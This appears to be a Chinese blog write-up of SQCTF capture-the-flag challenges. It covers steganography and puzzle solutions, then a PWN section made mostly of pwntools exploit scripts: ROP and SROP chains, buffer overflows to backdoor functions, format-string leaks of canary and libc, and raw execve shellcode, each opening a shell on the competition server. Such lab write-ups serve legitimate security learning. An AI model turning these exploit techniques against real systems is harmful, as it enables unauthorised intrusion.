<p>工具下载：<a target="_blank" rel="noopener" href="https://www.bertnase.de/npiet/npiet-1.3a-win32.zip">https://www.bertnase.de/npiet/npiet-1.3a-win32.zip</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.\npiet.exe -tpic .\<span class="number">1</span>.png</span><br><span class="line">SQCTF&#123;Hello world!&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-112.png"></p>
<h3 id="YuanShen-Start"><a href="#YuanShen-Start" class="headerlink" title="YuanShen_Start!"></a>YuanShen_Start!</h3><p>第一个压缩包密码<code>SQCTF&#123;yuan_shen_1s_a_good_game!&#125;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-113.png"></p>
<p>用上面得到的密码解压<code>原神启动.zip</code></p>
<p>翻看文档内容移开白色图片得到第二个密码：<code>SQCTF&#123;f968566s-3fb6-4bfd-885a-d9e102528784&#125;</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-114.png"></p>
<p>把<code>docx</code>后缀改为<code>zip</code>就能看到个压缩包</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-115.png"></p>
<p>把<code>image1.png</code>用010打开</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-116.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-117.png"></p>
<p>得到第三个密码<code>SQCTF&#123;6bb238u7r-6574-a7e6-0etg-7gsdycvdv27&#125;</code></p>
<p>用图片里面的密码解压<code>img.zip</code>然后再用文档里面的密码解压<code>text.txt</code>获得真正的flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-118.png"></p>
<h3 id="老君山的落日好美"><a href="#老君山的落日好美" class="headerlink" title="老君山的落日好美"></a>老君山的落日好美</h3><p>爆破压缩包获得密码<code>1352681</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-119.png"></p>
<p>看到图片右下角有明显FFT隐写的变形痕迹</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-120.png"></p>
<p>PuzzleSolver直接出</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-121.png"></p>
<h3 id="王者荣耀真是太好玩了"><a href="#王者荣耀真是太好玩了" class="headerlink" title="王者荣耀真是太好玩了"></a>王者荣耀真是太好玩了</h3><p>根据图片里面的人在王者搜</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-122.png"></p>
<p>然后在百度地图搜<code>辉煌烟草</code>就能看到flag</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-123.png"></p>
<h3 id="这是什么加密（一血）"><a href="#这是什么加密（一血）" class="headerlink" title="这是什么加密（一血）"></a>这是什么加密（一血）</h3><p>一眼XY 2024的base2048秒了</p>
<p><a target="_blank" rel="noopener" href="https://nerdmosis.com/tools/encode-and-decode-base2048">https://nerdmosis.com/tools/encode-and-decode-base2048</a></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-124.png"></p>
<h3 id="小巷人家"><a href="#小巷人家" class="headerlink" title="小巷人家"></a>小巷人家</h3><p>压缩包名为<code>寺庙名</code>，直接谷歌搜图</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-125.png"></p>
<p>flag为<code>SQCTF&#123;西园寺&#125;</code></p>
<h3 id="FFT-IFFT"><a href="#FFT-IFFT" class="headerlink" title="FFT IFFT"></a>FFT IFFT</h3><p>一道基于傅里叶变换域处理的题目，编写脚本恢复原来的视频</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import cv2</span><br><span class="line">import struct</span><br><span class="line">import numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">reconstruct_video</span>():</span><br><span class="line">    <span class="comment"># 创建输出目录</span></span><br><span class="line">    os.<span class="title function_ invoke__">makedirs</span>(<span class="string">&#x27;reconstructed_frames&#x27;</span>, exist_ok=True)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 读取r文件中的min和max值（大端格式）</span></span><br><span class="line">    with <span class="title function_ invoke__">open</span>(<span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        data = f.<span class="title function_ invoke__">read</span>()</span><br><span class="line">        num_frames = <span class="title function_ invoke__">len</span>(data) <span class="comment">// 8  # 每个帧占8字节</span></span><br><span class="line">        min_max_values = [struct.<span class="title function_ invoke__">unpack</span>(<span class="string">&#x27;!ff&#x27;</span>, data[i*<span class="number">8</span>:(i+<span class="number">1</span>)*<span class="number">8</span>]) <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(num_frames)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(num_frames):</span><br><span class="line">        <span class="comment"># 生成三位数文件名，例如001.png</span></span><br><span class="line">        filename = f<span class="string">&quot;&#123;i+1:03d&#125;.png&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 处理幅度谱</span></span><br><span class="line">        m_path = os.path.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;m&#x27;</span>, filename)</span><br><span class="line">        m_img = cv2.<span class="title function_ invoke__">imread</span>(m_path, cv2.IMREAD_GRAYSCALE)</span><br><span class="line">        <span class="keyword">if</span> m_img is None:</span><br><span class="line">            <span class="keyword">print</span>(f<span class="string">&quot;错误：无法读取&#123;m_path&#125;&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 反归一化幅度</span></span><br><span class="line">        min_val, max_val = min_max_values[i]</span><br><span class="line">        m_float = m_img.<span class="title function_ invoke__">astype</span>(np.float32)</span><br><span class="line">        log_amplitude = (m_float / <span class="number">255.0</span>) * (max_val - min_val) + min_val</span><br><span class="line">        amplitude = np.<span class="title function_ invoke__">exp</span>(log_amplitude)  <span class="comment"># 得到原始幅度</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 处理相位谱</span></span><br><span class="line">        p_path = os.path.<span class="title function_ invoke__">join</span>(<span class="string">&#x27;p&#x27;</span>, filename)</span><br><span class="line">        p_img = cv2.<span class="title function_ invoke__">imread</span>(p_path, cv2.IMREAD_GRAYSCALE)</span><br><span class="line">        <span class="keyword">if</span> p_img is None:</span><br><span class="line">            <span class="keyword">print</span>(f<span class="string">&quot;错误：无法读取&#123;p_path&#125;&quot;</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 反归一化相位到[-π, π]</span></span><br><span class="line">        p_float = p_img.<span class="title function_ invoke__">astype</span>(np.float32)</span><br><span class="line">        phase = (p_float / <span class="number">255.0</span>) * <span class="number">2</span> * np.pi - np.pi</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 重建FFT复数矩阵</span></span><br><span class="line">        fft_complex = amplitude * np.<span class="title function_ invoke__">exp</span>(<span class="number">1</span>j * phase)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 逆FFT变换</span></span><br><span class="line">        img_inv = np.fft.<span class="title function_ invoke__">ifft2</span>(np.fft.<span class="title function_ invoke__">ifftshift</span>(fft_complex))</span><br><span class="line">        img_inv = np.<span class="keyword">real</span>(img_inv)</span><br><span class="line">        img_inv = np.<span class="title function_ invoke__">clip</span>(img_inv, <span class="number">0</span>, <span class="number">255</span>).<span class="title function_ invoke__">astype</span>(np.uint8)  <span class="comment"># 转换为灰度图</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 保存重建的帧</span></span><br><span class="line">        cv2.<span class="title function_ invoke__">imwrite</span>(f<span class="string">&#x27;reconstructed_frames/&#123;filename&#125;&#x27;</span>, img_inv)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 使用ffmpeg合成视频</span></span><br><span class="line">    <span class="comment">// os.system(&#x27;ffmpeg -y -i reconstructed_frames/%03d.png -r 25 output.mp4&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="title function_ invoke__">reconstruct_video</span>()</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-126.png"></p>
<p>因为我没有直接安装ffmpeg，所以手动执行视频重建（其实也可以不用，上面恢复出来的flag其实很明显了）</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-127.png"></p>
<p>成功恢复视频</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-128.png"></p>
<p>flag为：<code>SQCTF&#123;HELLO&#125;</code></p>
<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="浅红欺醉粉，肯信有江梅"><a href="#浅红欺醉粉，肯信有江梅" class="headerlink" title="浅红欺醉粉，肯信有江梅"></a>浅红欺醉粉，肯信有江梅</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-129.png"></p>
<h3 id="领取你的小猫娘"><a href="#领取你的小猫娘" class="headerlink" title="领取你的小猫娘"></a>领取你的小猫娘</h3><p>只要输入超过76个字符即可获得shell</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-130.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-131.png"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.beiko.top/blog/2025/4/28/image-132.png"></p>
<h3 id="被酒莫惊春睡重"><a href="#被酒莫惊春睡重" class="headerlink" title="被酒莫惊春睡重"></a>被酒莫惊春睡重</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line"><span class="comment">#io = process(filename)</span></span><br><span class="line">io = remote(<span class="string">&#x27;challenge.qsnctf.com&#x27;</span>,<span class="number">32349</span>)</span><br><span class="line"><span class="comment">#elf = ELF(filename)</span></span><br><span class="line"></span><br><span class="line">rop = <span class="number">0x00000000004011e0</span> <span class="comment"># pop rdx ; pop rsi ; pop rdi ; pop rax ; ret</span></span><br><span class="line">syscall = <span class="number">0x4011EC</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io,&quot;b *0x401487&quot;)</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;请输入你的名字:&quot;</span>,<span class="string">&quot;carl&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;, &quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stack:&quot;</span>,<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;(1-3):&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">payload = flat([<span class="string">b&#x27;/bin/sh\x00&#x27;</span>,cyclic(<span class="number">0x20</span>),rop,<span class="number">0</span>,<span class="number">0</span>,stack,<span class="number">0x3b</span>,syscall])</span><br><span class="line">io.sendlineafter(<span class="string">&quot;字符）:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="当时只道是寻常"><a href="#当时只道是寻常" class="headerlink" title="当时只道是寻常"></a>当时只道是寻常</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./pwn01&quot;</span></span><br><span class="line"><span class="comment">#io = process(filename)</span></span><br><span class="line">io = remote(<span class="string">&#x27;challenge.qsnctf.com&#x27;</span>,<span class="number">30299</span>)</span><br><span class="line"><span class="comment">#elf = ELF(filename)</span></span><br><span class="line"></span><br><span class="line">pop_rsi_rax_ret = <span class="number">0x401049</span></span><br><span class="line">pop_rax_ret = <span class="number">0x40104A</span></span><br><span class="line">ret = <span class="number">0x40104B</span></span><br><span class="line">bin_sh = <span class="number">0x40203A</span></span><br><span class="line">syscall = <span class="number">0x401045</span> <span class="comment"># syscall;pop rbp;ret</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rax = <span class="number">0x3b</span></span><br><span class="line">frame.rdi = bin_sh</span><br><span class="line">frame.rsi = <span class="number">0x0</span></span><br><span class="line">frame.rdx = <span class="number">0x0</span></span><br><span class="line">frame.rip = <span class="number">0x401045</span></span><br><span class="line">frame.rsp = <span class="number">0x402508</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">payload = flat([<span class="number">0x402300</span>,pop_rax_ret,<span class="number">0xf</span>,syscall,frame])</span><br><span class="line">io.sendafter(<span class="string">&quot;extraordinary.\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="赌书消得泼茶香"><a href="#赌书消得泼茶香" class="headerlink" title="赌书消得泼茶香"></a>赌书消得泼茶香</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./pwn02&quot;</span></span><br><span class="line"><span class="comment">#io = process(filename)</span></span><br><span class="line">io = remote(<span class="string">&#x27;challenge.qsnctf.com&#x27;</span>,<span class="number">30779</span>)</span><br><span class="line"><span class="comment">#elf = ELF(filename)</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x401422</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">payload = flat([cyclic(<span class="number">0x68</span>),backdoor,<span class="number">0x0</span>,<span class="number">0x0</span>])</span><br><span class="line">io.sendlineafter(<span class="string">&quot;now?\n&quot;</span>,base64.b64encode(payload))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="江南无所有，聊赠一枝春"><a href="#江南无所有，聊赠一枝春" class="headerlink" title="江南无所有，聊赠一枝春"></a>江南无所有，聊赠一枝春</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./gift&quot;</span></span><br><span class="line"><span class="comment">#io = process(filename)</span></span><br><span class="line">io = remote(<span class="string">&#x27;challenge.qsnctf.com&#x27;</span>,<span class="number">31309</span>)</span><br><span class="line"><span class="comment">#elf = ELF(filename)</span></span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x4011BB</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">payload = flat([cyclic(<span class="number">72</span>),backdoor])</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Do you want my gift?\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="铜雀春深锁二乔"><a href="#铜雀春深锁二乔" class="headerlink" title="铜雀春深锁二乔"></a>铜雀春深锁二乔</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./pwn03&quot;</span></span><br><span class="line">io = process(filename)</span><br><span class="line"><span class="comment">#io = remote(&#x27;challenge.qsnctf.com&#x27;,32451)</span></span><br><span class="line"><span class="comment">#elf = ELF(filename)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io,&quot;b *$rebase(0x1253)&quot;)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;%11$p-%13$p-%15$p-%17$p&quot;</span></span><br><span class="line">io.sendafter(<span class="string">&quot;sun.\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">canary = <span class="built_in">int</span>(io.recv(<span class="number">18</span>),<span class="number">16</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">libc_base = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x29d90</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">pie = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x125B</span></span><br><span class="line">io.recvuntil(<span class="string">&quot;-&quot;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x148</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;canary:&quot;</span>,<span class="built_in">hex</span>(canary))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base:&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;pie:&quot;</span>,<span class="built_in">hex</span>(pie))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;stack:&quot;</span>,<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">leave_ret = pie + <span class="number">0x1259</span></span><br><span class="line">rdi = pie + <span class="number">0x0000000000001245</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">system_addr = pie + <span class="number">0x1253</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload = flat([<span class="string">&quot;aaaabbbb&quot;</span>,canary,stack+<span class="number">0x30</span>,pie+<span class="number">0x12b2</span>])</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">payload = flat([stack+<span class="number">0x10</span>,system_addr,<span class="string">&quot;/bin/sh\x00&quot;</span>])</span><br><span class="line">io.sendafter(<span class="string">&quot;sun.\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">payload = flat([<span class="string">&quot;aaaabbbb&quot;</span>,canary,stack+<span class="number">0x30</span>,rdi])</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="我觉君非池中物，咫尺蛟龙云雨"><a href="#我觉君非池中物，咫尺蛟龙云雨" class="headerlink" title="我觉君非池中物，咫尺蛟龙云雨"></a>我觉君非池中物，咫尺蛟龙云雨</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span></span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h3 id="萧萧黄叶闭疏窗"><a href="#萧萧黄叶闭疏窗" class="headerlink" title="萧萧黄叶闭疏窗"></a>萧萧黄叶闭疏窗</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;./bad&quot;</span></span><br><span class="line"><span class="comment">#io = process(filename)</span></span><br><span class="line">io = remote(<span class="string">&#x27;challenge.qsnctf.com&#x27;</span>,<span class="number">30296</span>)</span><br><span class="line">elf = ELF(filename)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(io,&quot;b vuln_func&quot;)</span></span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">payload = shellcode.ljust(<span class="number">72</span>,<span class="string">b&#x27;\x90&#x27;</span>) + p64(<span class="number">0x4040A0</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">&quot;What do you want to do ?\n&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



